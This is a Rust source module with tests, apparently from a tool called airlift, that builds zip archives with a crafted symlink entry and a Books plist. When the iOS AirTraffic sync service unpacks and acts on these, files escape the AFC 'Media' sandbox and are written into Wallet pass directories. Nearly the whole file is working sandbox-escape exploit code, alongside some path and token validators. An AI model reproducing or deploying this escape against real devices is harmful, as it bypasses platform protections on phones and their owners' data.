//! The zip and plist payloads airlift feeds the phone, and the naming rules.
//!
//! A card's files live in `/var/mobile/Library/Passes/Cards/<hash>.pkpass`, which
//! AFC cannot reach: it is rooted at `Media`, refuses `..`, and has no symlink
//! opcode. The way across is a zip written into `Media/airlift-src-<token>/`
//! whose `p0/p1/p2/link` entry is a *symlink* -- the mode bit is carried, not the
//! compression -- so the unzip that AirTraffic (a sync service running outside
//! the AFC sandbox) performs leaves a real link behind, one that points out of
//! `Media` and into the card. AirTraffic then moves files through that link.
//!
//! None of that needs a phone: the archives and the shelf list are pure data, so
//! they are built and checked here. Every byte is fixed -- timestamp, key order,
//! entry order -- so two runs of the same operation produce the same archive,
//! which is what makes the escape reviewable and its tests meaningful.

use crc32fast::Hasher;
use plist::{Dictionary, Value};

/// Name prefix of the staged source directory the archive is unpacked into.
pub const SOURCE_PREFIX: &str = "airlift-src-";
/// Name prefix of the staged symlink once AirTraffic moves it out of the source.
pub const LINK_PREFIX: &str = "airlift-link-";
/// Name prefix of the destination a taken file is parked under while staged.
pub const RECOVERED_PREFIX: &str = "airlift-recovered-";
/// Name prefix of the leaves the device scanner drops to prove it can write.
pub const CANARY_PREFIX: &str = "airlift-canary-";

/// Where AirTraffic resolves the identifiers in a Books plist from.
pub const AIRLOCK_ROOT: &str = "/var/mobile/Media/Airlock/Book";

/// The files under [`AIRLOCK_ROOT`] whose preimage a staged command restores.
///
/// A Books plist hands AirTraffic a list of moves; these six files record enough
/// of that state that an interrupted run can be rolled back to what it was.
pub const TRACKED_BOOKS_FILES: [&str; 6] = [
    "Books/Books.plist",
    "Books/Sync/Books.plist",
    "Books/Sync/Upload.plist",
    "Books/Sync/Database/OutstandingAssets_4.sqlite",
    "Books/Sync/Database/OutstandingAssets_4.sqlite-shm",
    "Books/Sync/Database/OutstandingAssets_4.sqlite-wal",
];

/// The directories under [`AIRLOCK_ROOT`] that the tracked files live in.
pub const TRACKED_BOOKS_DIRECTORIES: [&str; 3] = ["Books", "Books/Sync", "Books/Sync/Database"];

/// Bytes of entropy behind one generated name. 10 bytes spell 20 hex chars, the
/// shape the device side demands before it will touch a staged path.
const TOKEN_BYTES: usize = 10;
/// Hex characters in a [`token`].
const TOKEN_HEX: usize = 20;
/// Hex characters in a canary leaf's body.
const CANARY_HEX: usize = 32;

/// Directory entry mode: `S_IFDIR | 0o755`.
const DIR_MODE: u32 = 0o40755;
/// Regular-file entry mode: `S_IFREG | 0o600`.
const FILE_MODE: u32 = 0o100600;
/// Symlink entry mode: `S_IFLNK | 0o777`. This is the whole trick.
const SYMLINK_MODE: u32 = 0o120777;

/// Extra-field id Apple's unzip reads to recover an entry's unix mode.
const SZ_EXTRA_ID: u16 = 0x5A53;
/// Extractor version in both headers. STORED needs nothing newer than 2.0.
const ZIP_VERSION: u16 = 20;
/// Unix creator in the central directory's "version made by", so the mode sticks.
const CREATE_SYSTEM: u16 = 3;
/// Compression method 0: the entries are stored, never deflated.
const STORED: u16 = 0;

/// DOS time for 05:00:00. Pinned so the archive does not move between runs.
const DOS_TIME: u16 = 5 << 11;
/// DOS date for 2026-09-14: `(year - 1980) << 9 | month << 5 | day`.
const DOS_DATE: u16 = (2026 - 1980) << 9 | 9 << 5 | 14;

const LOCAL_SIGNATURE: u32 = 0x0403_4b50;
const CENTRAL_SIGNATURE: u32 = 0x0201_4b50;
const END_SIGNATURE: u32 = 0x0605_4b50;

const HEX_DIGITS: &[u8; 16] = b"0123456789abcdef";

/// A fresh staging token: 10 random bytes as 20 lowercase hex characters.
///
/// The device side only accepts a source, link and recovered name that carry the
/// same token with this exact shape, which is what keeps a stale staging tree
/// from a previous run from being mistaken for this one's.
pub fn token() -> String {
    let mut bytes = [0u8; TOKEN_BYTES];
    getrandom::fill(&mut bytes).expect("the operating system must supply entropy");
    let mut out = String::with_capacity(TOKEN_HEX);
    for byte in bytes {
        out.push(HEX_DIGITS[(byte >> 4) as usize] as char);
        out.push(HEX_DIGITS[(byte & 0x0f) as usize] as char);
    }
    out
}

/// The staged source directory name for `token`.
pub fn source_name(token: &str) -> String {
    format!("{SOURCE_PREFIX}{token}")
}

/// The staged link name for `token`.
pub fn link_name(token: &str) -> String {
    format!("{LINK_PREFIX}{token}")
}

/// The recovered destination name for `token`.
pub fn recovered_name(token: &str) -> String {
    format!("{RECOVERED_PREFIX}{token}")
}

/// The token inside `value` if it is a generated name built on `prefix`.
///
/// A name with any other shape -- wrong prefix, a path separator, an uppercase
/// or odd-length body -- is rejected rather than repaired, because accepting one
/// would let a caller direct a move at a path it did not generate.
pub fn generated_token<'a>(value: &'a str, prefix: &str) -> Option<&'a str> {
    if !value.starts_with(prefix) || value.contains('/') {
        return None;
    }
    let token = &value[prefix.len()..];
    is_lowercase_hex(token, TOKEN_HEX).then_some(token)
}

/// True when the three staged names all carry the same generated token.
pub fn generated_names_match(source: &str, link_destination: &str, recovered: &str) -> bool {
    let Some(token) = generated_token(source, SOURCE_PREFIX) else {
        return false;
    };
    generated_token(link_destination, LINK_PREFIX) == Some(token)
        && generated_token(recovered, RECOVERED_PREFIX) == Some(token)
}

/// True when `path` is a plain relative path with no way to leave its root.
///
/// Used on device-supplied path components before they are joined onto a staged
/// tree; a leading or trailing separators or an empty, `.` or `..` component is
/// exactly the input that would otherwise walk out of the staging directory.
pub fn is_safe_relative_path(path: &str) -> bool {
    if path.is_empty() || path.starts_with('/') || path.ends_with('/') {
        return false;
    }
    path.split('/')
        .all(|component| !component.is_empty() && component != "." && component != "..")
}

/// True when `leaf` names a canary the device scanner would plant.
pub fn is_canary_leaf(leaf: &str) -> bool {
    const SUFFIX: &str = ".bin";
    if leaf.len() < CANARY_PREFIX.len() + SUFFIX.len()
        || !leaf.starts_with(CANARY_PREFIX)
        || !leaf.ends_with(SUFFIX)
        || leaf.contains('/')
    {
        return false;
    }
    let body = &leaf[CANARY_PREFIX.len()..leaf.len() - SUFFIX.len()];
    is_lowercase_hex(body, CANARY_HEX)
}

fn is_lowercase_hex(value: &str, length: usize) -> bool {
    value.len() == length
        && value
            .bytes()
            .all(|byte| byte.is_ascii_digit() || (b'a'..=b'f').contains(&byte))
}

/// A single-file archive: `payload` is what the relocated link resolves to.
///
/// `target` is the absolute path the link should point at; the leading `/` is
/// dropped because the link's own relative prefix supplies the rest.
pub fn build_archive(target: &str, payload: &[u8]) -> Vec<u8> {
    let target_tail = target.get(1..).unwrap_or_default();
    let mut entries = header_entries(target_tail, false);
    entries.push(Entry::file("payload", payload.to_vec()));
    write_zip(&entries)
}

/// A batch archive: one `payload_<n>` per file.
///
/// `payload` is also written as a copy of the first file. The ported code always
/// emitted it, and a device-side step that expects the single-file entry would
/// otherwise move stale bytes, so the fallback is kept as-is.
///
/// The leaf names in `files` are *not* used: the device side renames each entry
/// onto the leaf it is moved to, so only the bodies matter here.
pub fn build_archive_multi(target: &str, files: &[(String, Vec<u8>)]) -> Vec<u8> {
    let target_tail = target.trim_start_matches('/');
    let mut entries = header_entries(target_tail, true);
    for (index, (_leaf, body)) in files.iter().enumerate() {
        entries.push(Entry::file(format!("payload_{index}"), body.clone()));
    }
    if let Some((_leaf, first)) = files.first() {
        entries.push(Entry::file("payload", first.clone()));
    }
    write_zip(&entries)
}

/// The shelf list AirTraffic reads to decide which files to move.
///
/// Each identifier is one move, counted from 1. AirTraffic accepts a run only
/// when the identifiers are contiguous in this order, so the numbering has to
/// match the destinations the staging code hands it.
pub fn build_books(identifiers: &[String]) -> Vec<u8> {
    let rows = identifiers
        .iter()
        .enumerate()
        .map(|(index, identifier)| {
            let mut row = Dictionary::new();
            row.insert("DSID".to_owned(), Value::from("1"));
            row.insert("Item ID".to_owned(), Value::from((index + 1).to_string()));
            row.insert("Persistent ID".to_owned(), Value::from(identifier.clone()));
            Value::Dictionary(row)
        })
        .collect();
    let mut books = Dictionary::new();
    books.insert("Books".to_owned(), Value::Array(rows));
    binary_plist(&books)
}

/// The fixed head of both archives, followed by the target's directory chain.
///
/// `skip_empty` mirrors the ported split: the single-file builder kept empty
/// components, the batch builder dropped them. The layouts must stay identical
/// to what was tested against a real phone, quirks included.
fn header_entries(target_tail: &str, skip_empty: bool) -> Vec<Entry> {
    let mut entries = vec![
        Entry::directory("META-INF/"),
        Entry::file("META-INF/com.apple.ZipMetadata.plist", zip_metadata()),
        Entry::directory("p0/"),
        Entry::directory("p0/p1/"),
        Entry::directory("p0/p1/p2/"),
        Entry {
            name: "p0/p1/p2/link".to_owned(),
            mode: SYMLINK_MODE,
            body: format!("../../../{target_tail}").into_bytes(),
        },
    ];
    let mut cursor = String::new();
    for component in target_tail.split('/') {
        if skip_empty && component.is_empty() {
            continue;
        }
        cursor.push_str(component);
        cursor.push('/');
        entries.push(Entry::directory(cursor.clone()));
    }
    entries
}

/// The plist Apple's unzip drops beside the extracted files.
fn zip_metadata() -> Vec<u8> {
    let mut metadata = Dictionary::new();
    metadata.insert("Version".to_owned(), Value::from(2u8));
    binary_plist(&metadata)
}

/// Encode a dictionary as a binary plist.
///
/// `Dictionary` keeps insertion order and this writer preserves it, so callers
/// must insert keys already sorted; that is what makes the bytes stable, since
/// the ported implementation wrote with `sort_keys=True`.
fn binary_plist(value: &Dictionary) -> Vec<u8> {
    let mut out = Vec::new();
    plist::to_writer_binary(&mut out, value)
        .expect("a plist of strings and small integers always encodes");
    out
}

/// One entry staged for [`write_zip`].
struct Entry {
    name: String,
    mode: u32,
    body: Vec<u8>,
}

impl Entry {
    fn directory(name: impl Into<String>) -> Self {
        Entry {
            name: name.into(),
            mode: DIR_MODE,
            body: Vec::new(),
        }
    }

    fn file(name: impl Into<String>, body: Vec<u8>) -> Self {
        Entry {
            name: name.into(),
            mode: FILE_MODE,
            body,
        }
    }
}

/// The unix-mode extra field both headers carry.
///
/// This is `struct.pack("<HHH", 0x5A53, 2, mode & 0xFFFF)` from the ported code;
/// the mode is written twice (here and in the external attributes) because
/// different unzip versions read different ones.
fn sz_extra(mode: u32) -> [u8; 6] {
    let mut extra = [0u8; 6];
    extra[0..2].copy_from_slice(&SZ_EXTRA_ID.to_le_bytes());
    extra[2..4].copy_from_slice(&2u16.to_le_bytes());
    extra[4..6].copy_from_slice(&((mode & 0xFFFF) as u16).to_le_bytes());
    extra
}

/// Assemble a STORED zip by hand.
///
/// The writer is hand-rolled because a general one would add its own defaults
/// (timestamps, data descriptors, an extra field of its own), and the phone's
/// unzip is the thing being matched. Every entry is STORED with a known size, so
/// no data descriptor is needed and no Zip64 record is ever emitted -- the sizes
/// are far below the 4 GiB that would require one, matching `allowZip64=False`.
fn write_zip(entries: &[Entry]) -> Vec<u8> {
    let mut local = Vec::new();
    let mut central = Vec::new();

    for entry in entries {
        let offset = local.len() as u32;
        let name = entry.name.as_bytes();
        let extra = sz_extra(entry.mode);
        let size = entry.body.len() as u32;
        let mut hasher = Hasher::new();
        hasher.update(&entry.body);
        let crc = hasher.finalize();

        push_u32(&mut local, LOCAL_SIGNATURE);
        push_u16(&mut local, ZIP_VERSION);
        push_u16(&mut local, 0); // flag bits: no descriptor, not encrypted
        push_u16(&mut local, STORED);
        push_u16(&mut local, DOS_TIME);
        push_u16(&mut local, DOS_DATE);
        push_u32(&mut local, crc);
        push_u32(&mut local, size);
        push_u32(&mut local, size);
        push_u16(&mut local, name.len() as u16);
        push_u16(&mut local, extra.len() as u16);
        local.extend_from_slice(name);
        local.extend_from_slice(&extra);
        local.extend_from_slice(&entry.body);

        push_u32(&mut central, CENTRAL_SIGNATURE);
        push_u16(&mut central, (CREATE_SYSTEM << 8) | ZIP_VERSION);
        push_u16(&mut central, ZIP_VERSION);
        push_u16(&mut central, 0);
        push_u16(&mut central, STORED);
        push_u16(&mut central, DOS_TIME);
        push_u16(&mut central, DOS_DATE);
        push_u32(&mut central, crc);
        push_u32(&mut central, size);
        push_u32(&mut central, size);
        push_u16(&mut central, name.len() as u16);
        push_u16(&mut central, extra.len() as u16);
        push_u16(&mut central, 0); // comment length
        push_u16(&mut central, 0); // disk number start
        push_u16(&mut central, 0); // internal attributes
        push_u32(&mut central, (entry.mode & 0xFFFF) << 16);
        push_u32(&mut central, offset);
        central.extend_from_slice(name);
        central.extend_from_slice(&extra);
    }

    let count = entries.len() as u16;
    let central_offset = local.len() as u32;
    let central_size = central.len() as u32;
    local.extend_from_slice(&central);

    push_u32(&mut local, END_SIGNATURE);
    push_u16(&mut local, 0); // this disk
    push_u16(&mut local, 0); // disk holding the central directory
    push_u16(&mut local, count);
    push_u16(&mut local, count);
    push_u32(&mut local, central_size);
    push_u32(&mut local, central_offset);
    push_u16(&mut local, 0); // comment length
    local
}

fn push_u16(out: &mut Vec<u8>, value: u16) {
    out.extend_from_slice(&value.to_le_bytes());
}

fn push_u32(out: &mut Vec<u8>, value: u32) {
    out.extend_from_slice(&value.to_le_bytes());
}

#[cfg(test)]
mod tests {
    use std::io::{Cursor, Read};

    use super::*;
    use zip::CompressionMethod;

    const TARGET: &str = "/var/mobile/Library/Passes/Cards/EXAMPLE.pkpass";

    fn archive(bytes: &[u8]) -> zip::ZipArchive<Cursor<Vec<u8>>> {
        zip::ZipArchive::new(Cursor::new(bytes.to_vec())).expect("a readable archive")
    }

    fn read(zip: &mut zip::ZipArchive<Cursor<Vec<u8>>>, name: &str) -> Vec<u8> {
        let mut file = zip.by_name(name).expect("the entry exists");
        let mut out = Vec::new();
        file.read_to_end(&mut out).expect("the entry reads");
        out
    }

    fn unix_mode(zip: &mut zip::ZipArchive<Cursor<Vec<u8>>>, name: &str) -> Option<u32> {
        zip.by_name(name).expect("the entry exists").unix_mode()
    }

    #[test]
    fn the_batch_archive_has_the_ported_entry_order() {
        let files = vec![
            ("a.png".to_owned(), b"first".to_vec()),
            ("b.png".to_owned(), b"second".to_vec()),
        ];
        let bytes = build_archive_multi(TARGET, &files);
        let mut zip = archive(&bytes);

        let names: Vec<String> = (0..zip.len())
            .map(|index| {
                zip.by_index(index)
                    .expect("the entry exists")
                    .name()
                    .to_owned()
            })
            .collect();
        assert_eq!(
            names,
            vec![
                "META-INF/",
                "META-INF/com.apple.ZipMetadata.plist",
                "p0/",
                "p0/p1/",
                "p0/p1/p2/",
                "p0/p1/p2/link",
                "var/",
                "var/mobile/",
                "var/mobile/Library/",
                "var/mobile/Library/Passes/",
                "var/mobile/Library/Passes/Cards/",
                "var/mobile/Library/Passes/Cards/EXAMPLE.pkpass/",
                "payload_0",
                "payload_1",
                "payload",
            ]
        );
        for index in 0..zip.len() {
            assert_eq!(
                zip.by_index(index).expect("the entry exists").compression(),
                CompressionMethod::Stored,
                "entry {index} must be stored"
            );
        }
    }

    #[test]
    fn the_metadata_plist_is_version_two() {
        let mut zip = archive(&build_archive(TARGET, b"x"));
        let metadata = read(&mut zip, "META-INF/com.apple.ZipMetadata.plist");
        let parsed: Value = plist::from_bytes(&metadata).expect("a binary plist");
        let mut expected = Dictionary::new();
        expected.insert("Version".to_owned(), Value::from(2u8));
        assert_eq!(parsed, Value::Dictionary(expected));
    }

    #[test]
    fn the_link_points_at_the_target_with_the_modes_preserved() {
        let mut zip = archive(&build_archive(TARGET, b"aircard-test-payload"));

        assert_eq!(
            read(&mut zip, "p0/p1/p2/link"),
            b"../../../var/mobile/Library/Passes/Cards/EXAMPLE.pkpass".to_vec()
        );
        assert_eq!(unix_mode(&mut zip, "p0/p1/p2/link"), Some(SYMLINK_MODE));
        assert_eq!(read(&mut zip, "payload"), b"aircard-test-payload".to_vec());
        assert_eq!(unix_mode(&mut zip, "payload"), Some(FILE_MODE));
        assert_eq!(
            unix_mode(&mut zip, "META-INF/com.apple.ZipMetadata.plist"),
            Some(FILE_MODE)
        );
        for directory in [
            "META-INF/",
            "p0/",
            "p0/p1/",
            "p0/p1/p2/",
            "var/",
            "var/mobile/Library/Passes/Cards/EXAMPLE.pkpass/",
        ] {
            assert_eq!(
                unix_mode(&mut zip, directory),
                Some(DIR_MODE),
                "{directory}"
            );
        }
    }

    #[test]
    fn the_link_entry_carries_the_sz_extra_field() {
        let mut zip = archive(&build_archive(TARGET, b"x"));
        let expected: &[u8] = &[0x53, 0x5A, 0x02, 0x00, 0xFF, 0xA1];
        assert_eq!(
            zip.by_name("p0/p1/p2/link").expect("the link").extra_data(),
            Some(expected)
        );
    }

    #[test]
    fn the_archives_are_byte_for_byte_reproducible() {
        assert_eq!(
            build_archive(TARGET, b"aircard-test-payload"),
            build_archive(TARGET, b"aircard-test-payload")
        );
        let files = vec![("a.png".to_owned(), b"first".to_vec())];
        assert_eq!(
            build_archive_multi(TARGET, &files),
            build_archive_multi(TARGET, &files)
        );
    }

    #[test]
    fn the_batch_archive_only_adds_payload_when_there_are_files() {
        let mut empty = archive(&build_archive_multi("/x", &[]));
        assert!(empty.by_name("payload").is_err());

        let files = vec![
            ("leaf".to_owned(), b"first".to_vec()),
            ("other".to_owned(), b"second".to_vec()),
        ];
        let mut zip = archive(&build_archive_multi("/x", &files));
        assert_eq!(read(&mut zip, "payload"), read(&mut zip, "payload_0"));
        assert_eq!(read(&mut zip, "payload_1"), b"second".to_vec());
    }

    #[test]
    fn the_shelf_list_counts_from_one() {
        let bytes = build_books(&["a".to_owned(), "b".to_owned()]);
        let parsed: Value = plist::from_bytes(&bytes).expect("a binary plist");
        let Value::Dictionary(root) = parsed else {
            panic!("the root is a dictionary");
        };
        let Value::Array(rows) = root.get("Books").expect("a Books array") else {
            panic!("Books is an array");
        };
        assert_eq!(rows.len(), 2);
        for (row, (identifier, item)) in rows.iter().zip([("a", "1"), ("b", "2")]) {
            let Value::Dictionary(row) = row else {
                panic!("a row is a dictionary");
            };
            assert_eq!(
                row.get("Persistent ID"),
                Some(&Value::from(identifier.to_owned()))
            );
            assert_eq!(row.get("Item ID"), Some(&Value::from(item.to_owned())));
            assert_eq!(row.get("DSID"), Some(&Value::from("1".to_owned())));
        }
    }

    #[test]
    fn generated_names_must_agree_on_one_fresh_token() {
        let value = token();
        let source = source_name(&value);
        let link = link_name(&value);
        let recovered = recovered_name(&value);

        assert_eq!(
            generated_token(&source, SOURCE_PREFIX),
            Some(value.as_str())
        );
        assert!(generated_names_match(&source, &link, &recovered));

        assert_eq!(generated_token(&source, LINK_PREFIX), None);
        assert_eq!(
            generated_token(&source_name(&value[..18]), SOURCE_PREFIX),
            None
        );
        assert_eq!(
            generated_token(
                &format!("{SOURCE_PREFIX}{}", value.to_uppercase()),
                SOURCE_PREFIX
            ),
            None
        );
        assert_eq!(
            generated_token(&format!("{SOURCE_PREFIX}{value}/x"), SOURCE_PREFIX),
            None
        );
        assert!(!generated_names_match(
            &source,
            &link_name("00000000000000000000"),
            &recovered
        ));
    }

    #[test]
    fn safe_relative_paths_have_no_way_out() {
        assert!(is_safe_relative_path("Books/Books.plist"));
        assert!(is_safe_relative_path("cardBackground.png"));

        for unsafe_path in [
            "",
            "/Books/Books.plist",
            "Books/",
            "Books//Books.plist",
            "Books/./Books.plist",
            "Books/../Books.plist",
            "..",
        ] {
            assert!(
                !is_safe_relative_path(unsafe_path),
                "{unsafe_path:?} must be rejected"
            );
        }
    }

    #[test]
    fn canary_leaves_are_thirty_two_lowercase_hex() {
        let hex = "0123456789abcdef0123456789abcdef";
        assert!(is_canary_leaf(&format!("{CANARY_PREFIX}{hex}.bin")));
        assert!(!is_canary_leaf(&format!(
            "{CANARY_PREFIX}{}.bin",
            &hex[..31]
        )));
        assert!(!is_canary_leaf(&format!("{CANARY_PREFIX}{hex}0.bin")));
        assert!(!is_canary_leaf(&format!("{CANARY_PREFIX}{hex}.plist")));
        assert!(!is_canary_leaf(&format!(
            "{CANARY_PREFIX}{}.bin",
            hex.to_uppercase()
        )));
        assert!(!is_canary_leaf(&format!("{CANARY_PREFIX}{hex}/x.bin")));
        assert!(!is_canary_leaf(&format!("{CANARY_PREFIX}.bin")));
    }

    #[test]
    fn tokens_are_twenty_lowercase_hex_and_unique() {
        let first = token();
        let second = token();
        assert_eq!(first.len(), TOKEN_HEX);
        assert!(first
            .bytes()
            .all(|byte| byte.is_ascii_digit() || (b'a'..=b'f').contains(&byte)));
        assert_ne!(first, second);
    }
}
